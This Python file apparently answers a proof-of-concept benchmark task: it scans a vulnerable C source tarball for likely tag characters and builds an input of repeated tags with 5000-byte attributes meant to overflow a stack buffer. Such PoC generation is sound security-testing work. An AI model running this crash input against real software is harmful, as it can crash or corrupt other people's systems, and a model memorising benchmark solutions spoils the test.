import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Try to infer tag openers from the source; fall back to common ones.
        try:
            inferred_openers = self._extract_tag_openers(src_path)
        except Exception:
            inferred_openers = set()

        if not inferred_openers:
            inferred_openers = {'<', '[', '{'}

        payload = self._build_payload(inferred_openers)
        return payload

    def _extract_tag_openers(self, src_path: str) -> set:
        """
        Heuristically infer likely tag opening characters from the C sources.
        Focuses on characters like '<', '[', '{', '(' that appear in char or
        string literals near the word 'tag'.
        """
        default_candidates = ['<', '[', '{', '(']
        opener_scores = {}

        try:
            tf = tarfile.open(src_path, 'r:*')
        except Exception:
            return set()

        with tf:
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                name = member.name.lower()
                if not name.endswith(('.c', '.h', '.cpp', '.cc', '.cxx', '.hpp')):
                    continue

                f = tf.extractfile(member)
                if f is None:
                    continue
                try:
                    content = f.read().decode('utf-8', 'ignore')
                finally:
                    f.close()

                if not content:
                    continue

                # Higher weight for characters that appear near the word "tag"
                for m in re.finditer(r'tag', content, re.IGNORECASE):
                    start = max(0, m.start() - 200)
                    end = min(len(content), m.end() + 200)
                    chunk = content[start:end]

                    # Char literals, e.g., '<'
                    for m2 in re.finditer(r"'(.)'", chunk):
                        ch = m2.group(1)
                        if ch in default_candidates:
                            opener_scores[ch] = opener_scores.get(ch, 0) + 3

                    # String literals, e.g., "<"
                    for m2 in re.finditer(r'"(.)"', chunk):
                        ch = m2.group(1)
                        if ch in default_candidates:
                            opener_scores[ch] = opener_scores.get(ch, 0) + 1

                # Global, low-weight hints
                for ch in default_candidates:
                    if ("'%s'" % ch) in content or ('"%s"' % ch) in content:
                        opener_scores[ch] = opener_scores.get(ch, 0) + 1

        if not opener_scores:
            return set()

        # Take top-scoring candidates (up to 3)
        sorted_chars = sorted(opener_scores.items(), key=lambda kv: -kv[1])
        openers = {ch for ch, score in sorted_chars[:3] if score > 0}
        return openers

    def _build_payload(self, openers: set) -> bytes:
        """
        Build a large input containing many tags and very long attribute values
        to stress any stack-based output buffer used when processing tags.
        """
        # Ensure some common openers are always present
        base_fallback = ['<', '[', '{']
        all_openers = []
        seen = set()
        for op in list(openers) + base_fallback:
            if op not in seen:
                all_openers.append(op)
                seen.add(op)

        closers_map = {
            '<': '>',
            '[': ']',
            '{': '}',
            '(': ')',
            '#': '#',
            '@': '@',
        }

        # Length of an attribute value; chosen to comfortably exceed typical
        # small stack buffers (e.g., 1KB).
        attr_len = 5000
        big_attr = "A" * attr_len

        # Some common tag names to include for HTML-like syntaxes
        common_tag_names = ['tag', 'b', 'i', 'u', 'font', 'div', 'span', 'pre', 'code', 'strong']

        pieces = []

        for op in all_openers:
            cl = closers_map.get(op, '>' if op == '<' else op)

            # Many small tags to grow any output buffer incrementally
            simple_tags = []

            if op == '<':
                for name in common_tag_names:
                    simple_tags.append(f"{op}{name}{cl}")
                    # opening + closing pair
                    simple_tags.append(f"{op}{name}{cl}{op}/{name}{cl}")
            else:
                # Generic bracketed tags
                simple_tags.append(f"{op}TAG{cl}")
                simple_tags.append(f"{op}LONGTAG{cl}")

            # Repeat the simple tag patterns many times
            repeated_simple = ("".join(simple_tags)) * 80
            pieces.append(repeated_simple)
            pieces.append("\n")

            # Add one or more tags with an extremely long attribute to stress
            # any per-tag temporary stack buffer or unbounded copy.
            if op == '<':
                big_tag1 = f'{op}tag attr="{big_attr}"{cl}'
                big_tag2 = f'{op}verylongtagname data="{big_attr}" other="{big_attr}"{cl}'
                pieces.append(big_tag1)
                pieces.append("\n")
                pieces.append(big_tag2)
                pieces.append("\n")
            elif op == '[':
                big_tag = f"{op}tag={big_attr}{cl}"
                pieces.append(big_tag)
                pieces.append("\n")
            else:
                big_tag = f"{op}tag{big_attr}{cl}"
                pieces.append(big_tag)
                pieces.append("\n")

        # Final payload string
        payload_str = "".join(pieces) + "\n"
        return payload_str.encode("ascii", "replace")